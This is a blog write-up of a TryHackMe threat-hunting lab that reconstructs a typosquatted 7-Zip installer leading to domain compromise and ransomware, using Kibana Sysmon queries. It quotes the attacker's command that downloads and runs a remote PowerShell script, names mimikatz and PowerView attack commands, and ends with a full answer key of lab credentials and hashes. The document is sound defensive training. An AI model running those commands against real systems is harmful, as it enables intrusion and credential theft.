---
title: "TryHackMe Hunt Me II Typo Squatters: One MSI to Domain Admin"
date: 2026-08-11T16:20:00+05:30
lastmod: 2026-08-11T16:24:00+05:30
author: Animesh Roy
avatar: /img/avatar.jpeg
authorlink: https://anir0y.in
featureimage: img/thm-typosquat/00-thumbnail.png

categories:
  - TryHackMe
tags:
  - tryhackme
  - thm
  - rooms
  - SOC Level 2
  - Threat Hunting
  - Active Directory
  - DFIR

draft: false
description: "Walkthrough of TryHackMe Hunt Me II Typo Squatters: tracing a typosquatted 7-Zip MSI through LSASS dumping, DCSync, and ransomware in one Sysmon index."
---

## Hunt Me II: Typo Squatters

The second Hunt Me room starts with a developer who installed the wrong 7-Zip. From that single typosquatted MSI you have to reconstruct a full domain compromise, 15 questions, all from one `winlogbeat` Sysmon index. It is a long chain, so the trick is to walk it as a story: root cause, service, credentials, escalation, and impact.

![The Hunt Me II Typo Squatters room on TryHackMe marked Room completed 100 percent, all 15 questions answered](/img/thm-typosquat/01-room.png)

## Root cause: the typosquatted 7-Zip

The download's mark-of-the-web is the fastest way in. Filtering Sysmon file-stream events for the suspicious domain, `winlog.event_id:15 and message:*7zipp*`, returns a single hit: a `Zone.Identifier` written by chrome.exe when it saved the file, and the event's `HostUrl` is the answer, **`http://www.7zipp.org/a/7z2301-x64.msi`**, a lookalike of the real `7-zip.org`.

![Real Kibana Discover view: the query winlog.event_id:15 and message contains 7zipp returns one mark-of-the-web event showing 7z2301-x64.msi saved into perry.parsons Downloads by chrome.exe](/img/thm-typosquat/kb-01-download.png)

The domain resolves (Event ID 22) to **`206.189.34.218`**. Pivoting to how the MSI ran, `process.name:"msiexec.exe" and process.command_line:*7z2301*` shows it executed by **`msiexec.exe`, PID 2532**, spawned by chrome.exe.

![Real Kibana Discover view: filtering msiexec.exe running 7z2301-x64.msi shows process ID 2,532 with parent chrome.exe](/img/thm-typosquat/kb-02-msiexec.png)

The MSI kicks off a second-stage payload, **`powershell.exe iex(iwr http://www.7zipp.org/a/7z.ps1 -useb)`**. That `7z.ps1` is clever: it downloads and silently installs the *real* 7-Zip to **`C:\Windows\Temp\7zlegit.exe`** as a decoy so the user sees a working install, then drops a malicious DLL and registers it as a service with `sc.exe create 7zService binpath= "C:\Program Files\7-zip\7zipp.exe"`. Searching `process.command_line:*7zService* or process.command_line:*7zlegit*` surfaces exactly that activity: the installed service is **`7zService`**, running as **`SYSTEM`**, and the decoy installer runs as `"C:\Windows\Temp\7zlegit.exe" /S`.

![Real Kibana Discover view: the 7zService or 7zlegit query returns three hits including the silent 7zlegit.exe decoy installer](/img/thm-typosquat/kb-03-service.png)

## Credential access

Running as SYSTEM, the implant goes after credentials. It pulls `Invoke-NanoDump.ps1` to dump LSASS to a disguised file (`trash.evtx`), then parses that dump with **`Invoke-PowerExtract`** (from `pwrex.ps1`) to harvest cleartext hashes. The prize is **`james.cromwell : B852A0B8BD4E00564128E0A5EA2BC4CF`**, an NTLM hash the attacker immediately reuses with `mimikatz sekurlsa::pth`.

## Escalation to domain admin

{{< ad >}}

With james.cromwell's context the attacker pivots into Active Directory. Using PowerView's `Set-DomainUserPassword`, they reset **`SSF\anna.jones`** to the password **`pwn3dpw!!!`** and log in with it on **`WKSTN-02`**. Enumerating onward to WKSTN-03 they uncover a second stored credential, **`SSF\itadmin : NoO6@39Sk0!`**.

The endgame is a DCSync of the domain admin, `damian.hall`. It is run with mimikatz (`lsadump::dcsync`) and, the room's answer, also with the PowerShell script **`Invoke-SharpKatz.ps1`** (`Invoke-Sharpkatz --Command dcsync --User damian.hall`). The replication output hands over damian.hall's **AES256 key `f28a16b8d3f5163cb7a7f7ed2c8f2cf0419f0b0c2e28c15f831d050f5edaa534`**.

## Impact

Domain admin in hand, the attacker deploys ransomware, `bomb.exe` (downloaded as `777bomb.exe`), across workstations. The count falls straight out of Discover: `process.name:"bomb.exe" and winlog.event_id:11` returns **46 hits**, each a file the ransomware created and renamed with a `.777zzz` extension.

![Real Kibana Discover view: process.name bomb.exe with event ID 11 returns 46 hits, files renamed to a .777zzz extension](/img/thm-typosquat/kb-07-ransomware.png)

![Card listing all fifteen answers for the room](/img/thm-typosquat/04-answers.png)

## Every answer

| # | Question | Answer |
|---|---|---|
| 1 | Malware URL | `http://www.7zipp.org/a/7z2301-x64.msi` |
| 2 | Malware host IP | `206.189.34.218` |
| 3 | Executing PID | `2532` |
| 4 | Second-stage command | `powershell.exe iex(iwr http://www.7zipp.org/a/7z.ps1 -useb)` |
| 5 | Legit installer path | `C:\Windows\Temp\7zlegit.exe` |
| 6 | Service installed | `7zService` |
| 7 | Service account | `SYSTEM` |
| 8 | LSASS parse tool | `Invoke-PowerExtract` |
| 9 | Harvested credential | `james.cromwell:B852A0B8BD4E00564128E0A5EA2BC4CF` |
| 10 | Reset password | `pwn3dpw!!!` |
| 11 | Workstation used | `WKSTN-02` |
| 12 | Discovered credential | `SSF\itadmin:NoO6@39Sk0!` |
| 13 | DA-dump script | `Invoke-SharpKatz.ps1` |
| 14 | damian.hall AES256 | `f28a16b8d3f5163cb7a7f7ed2c8f2cf0419f0b0c2e28c15f831d050f5edaa534` |
| 15 | Files encrypted | `46` |

## Wrap-up

Typo Squatters is the whole SOC Level 2 Threat Hunting module compressed into one incident: a phishing-style root cause, service persistence, LSASS credential access, Pass-the-Hash and DCSync for escalation, and ransomware for impact. Because it all lands in a single Sysmon index, the discipline that pays off is timeline discipline, following each artefact to the next: the Zone.Identifier to the MSI, the MSI to the service, the service's SYSTEM context to the LSASS dump, the harvested hash to Pass-the-Hash, and the reset and discovered credentials up to the domain admin. The one deliberately tricky point is separating the tools, NanoDump dumps, PowerExtract parses, SharpKatz DCSyncs, and reading each command line closely is what tells them apart. Trace the story end to end and the 15 flags fall out in order.
